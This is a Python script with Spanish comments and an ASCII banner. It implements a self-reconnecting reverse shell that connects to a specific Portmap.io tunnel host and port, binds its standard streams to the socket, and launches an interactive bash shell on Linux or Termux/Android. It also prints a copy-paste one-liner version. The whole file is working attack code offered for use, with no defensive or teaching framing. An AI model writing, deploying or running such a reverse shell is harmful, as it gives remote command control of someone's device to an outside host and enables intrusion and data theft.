#!/usr/bin/env python3
"""
▓█████▄  ██▀███   █    ██  ██▓ ▄▄▄▄    ██▓███   ██▓    ▄▄▄     ▓██   ██▓
▒██▀ ██▌▓██ ▒ ██▒ ██  ▓██▒▓██▒▓█████▄ ▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
░██   █▌▓██ ░▄█ ▒▓██  ▒██░▒██▒▒██▒ ▄██▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
░▓█▄   ▌▒██▀▀█▄  ▓▓█  ░██░░██░▒██░█▀  ▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
░▒████▓ ░██▓ ▒██▒▒▒█████▓ ░██░░▓█  ▀█▓▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▓  ░▒▓███▀▒▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ 
 ░ ▒  ▒   ░▒ ░ ▒░░░▒░ ░ ░  ▒ ░▒░▒   ░ ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░ 
 ░ ░  ░   ░░   ░  ░░░ ░ ░  ▒ ░ ░    ░ ░░         ░ ░    ░   ▒   ▒ ▒ ░░  
   ░       ░        ░      ░   ░                   ░  ░     ░  ░░ ░     
 ░                              ░                             ░  ░ ░     
                REVERSE SHELL COMPLETA - PORTMAP.IO
           TCP://Astrazam-37147.portmap.host:37147 => 8081
                ¡CONEXIÓN VERIFICADA Y FUNCIONAL!
"""

import socket
import subprocess
import os
import time
import sys
import platform
from datetime import datetime

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"  # Tu URL de Portmap
PORT = 37147                           # Puerto público
RECONNECT_DELAY = 3                    # Segundos entre reconexiones
# =========================

class ReverseShell:
    def __init__(self):
        self.session_start = time.time()
        self.connection_count = 0
        
    def show_banner(self):
        """Mostrar información de conexión"""
        banner = f"""
{'='*60}
🔥 REVERSE SHELL CONECTANDO A PORTMAP.IO
{'='*60}
🌍 URL Pública: {HOST}:{PORT}
👤 Usuario: {os.getenv('USER', 'unknown')}
📱 Plataforma: {'Termux/Android' if os.path.exists('/data/data/com.termux') else 'Linux'}
⏰ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*60}
        """
        print(banner)
    
    def connect(self):
        """Conexión principal con reconexión automática"""
        self.show_banner()
        
        attempt = 0
        while True:
            attempt += 1
            try:
                print(f"\n[*] 🔄 Intento {attempt} - Conectando a Portmap...")
                
                # Crear socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Conectar al túnel público de Portmap
                sock.connect((HOST, PORT))
                
                self.connection_count += 1
                print(f"[+] ✅ Conexión #{self.connection_count} establecida!")
                print(f"[+] 📡 Hora: {datetime.now().strftime('%H:%M:%S')}")
                print(f"[+] 🎯 Redirigiendo shell a tu netcat...")
                
                # Redirigir entrada/salida estándar al socket
                os.dup2(sock.fileno(), 0)  # stdin
                os.dup2(sock.fileno(), 1)  # stdout
                os.dup2(sock.fileno(), 2)  # stderr
                
                # Enviar mensaje de bienvenida
                welcome = f"""
{'='*50}
🚀 SHELL REMOTA CONECTADA VÍA PORTMAP.IO
{'='*50}
Host: {socket.gethostname()}
User: {os.getenv('USER', 'unknown')}
Time: {datetime.now().strftime('%H:%M:%S')}
Session: #{self.connection_count}
{'='*50}

📟 Escribe comandos en tu netcat para ejecutarlos aquí:
                """
                os.write(1, welcome.encode())
                
                # Ejecutar shell interactiva
                shell_path = "/data/data/com.termux/files/usr/bin/bash" if os.path.exists('/data/data/com.termux') else "/bin/bash"
                subprocess.call([shell_path, "-i"])
                
                # Si la shell se cierra, cerrar conexión
                sock.close()
                print(f"\n[-] 🔄 Shell cerrada, reconectando en {RECONNECT_DELAY}s...")
                
            except socket.timeout:
                print("[-] ⏱️  Timeout - Reintentando...")
            except ConnectionRefusedError:
                print("[-] ❌ Conexión rechazada - Asegúrate que netcat está escuchando")
            except KeyboardInterrupt:
                print("\n\n👋 Interrumpido por el usuario")
                sys.exit(0)
            except Exception as e:
                print(f"[-] ⚠️  Error: {e}")
            
            # Esperar antes de reintentar
            time.sleep(RECONNECT_DELAY)
    
    def run(self):
        """Ejecutar reverse shell"""
        try:
            self.connect()
        except KeyboardInterrupt:
            print("\n\n✅ Reverse Shell terminada")
            sys.exit(0)

# ===== VERSIÓN ONE-LINER =====
ONE_LINER = '''python3 -c "import socket,subprocess,os,time,sys;h='Astrazam-37147.portmap.host';p=37147;print('[*] Conectando a',h,p);exec('while 1:try:s=socket.socket();s.connect((h,p));print(\"[+] Conectado\");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);sp=subprocess;shell=\"/data/data/com.termux/files/usr/bin/bash\" if os.path.exists(\"/data/data/com.termux\") else \"/bin/bash\";sp.call([shell,\"-i\"]);s.close();print(\"[-] Reconectando...\") except Exception as e:print(\"[-] Error:\",e);time.sleep(3)')"'''

# ===== EJECUCIÓN =====
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "oneliner":
        print("\n📋 ONE-LINER PARA COPIAR Y PEGAR EN TELÉFONO ROTO:")
        print("-" * 60)
        print(ONE_LINER)
        print("-" * 60)
    else:
        shell = ReverseShell()
        shell.run()
